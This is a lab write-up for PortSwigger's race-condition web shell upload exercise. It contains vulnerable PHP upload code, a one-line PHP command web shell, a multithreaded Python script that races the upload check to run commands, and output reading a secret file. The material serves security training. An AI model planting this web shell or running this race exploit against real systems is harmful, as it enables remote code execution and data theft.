# Web shell upload via race condition

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition), you'll learn: Web shell upload via race condition! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-7/images/Pasted%20image%2020221216033346.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-7/images/Pasted%20image%2020221216033400.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-7/images/Pasted%20image%2020221216033418.png)

In previous labs, we found the image upload function is vulnerable.

**In the lab hint, it provides the image upload function PHP code:**
```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

**Let's break it down:**

- When we upload a file, **it'll create a temporary file, which the uploaded one**
- After that, **it checks our file contains viruse or not**, and check the file type
	- Function `checkFileType($fileName)` checks the extension is `jpg` or `png`

Armed with above information, we can see that **it's vulnerable to race condition.**

**This is because after we uploaded a file, it's still exist temporary. Also, the `checkViruses` function should take some time to work!**

So, in theory, we can still execute any commands!

Let's try that!

**To do so, we need to:**

- Create a PHP web shell:

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-7]
└─# echo "<?php system($_GET['cmd']); ?>" > webshell.php
```

**Then, to exploit race condition, I'll write a python script that continuously upload the PHP web shell:**
```py
#!/usr/bin/python3

import requests
from threading import Thread
from time import sleep
import argparse

def sendRequest(url, cookie, files, data):
    requests.post(url + 'my-account/avatar', cookies=cookie, files=files, data=data)

def receiveRequest(url, command):
    requestGET = requests.get(url + f'files/avatars/webshell.php?cmd={command}')

    if requestGET.status_code == 200 and requestGET.text != '':
        print(requestGET.text)

def main():
    url = 'https://0ad6002d040af2d7c0a5b8e200a9004e.web-security-academy.net/'

    cookie = {
        'session': 'YOUR_SESSIONID'
    }

    files = {
        'avatar': open('./webshell.php', 'rb')
    }

    data = {
        'user': 'wiener',
        'csrf': 'YOUR_CSRF_TOKEN'
    }

    # Create 200 jobs
    for job in range(200):
        Thread(target=sendRequest, args=(url, cookie, files, data)).start()
        Thread(target=receiveRequest, args=(url, args.command)).start()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--command', required=True, help='The command you want to execute.')
    args = parser.parse_args()

    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-7]
└─# python3 exploit.py -c id
uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
```

It worked!

**Finally, we can `cat` the `secret` file!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-7]
└─# python3 exploit.py -c 'cat /home/carlos/secret'
fiLAg8UZ69fWjhobLxO4cy4q12RmCCbq
```

Nice!

# What we've learned:

1. Web shell upload via race condition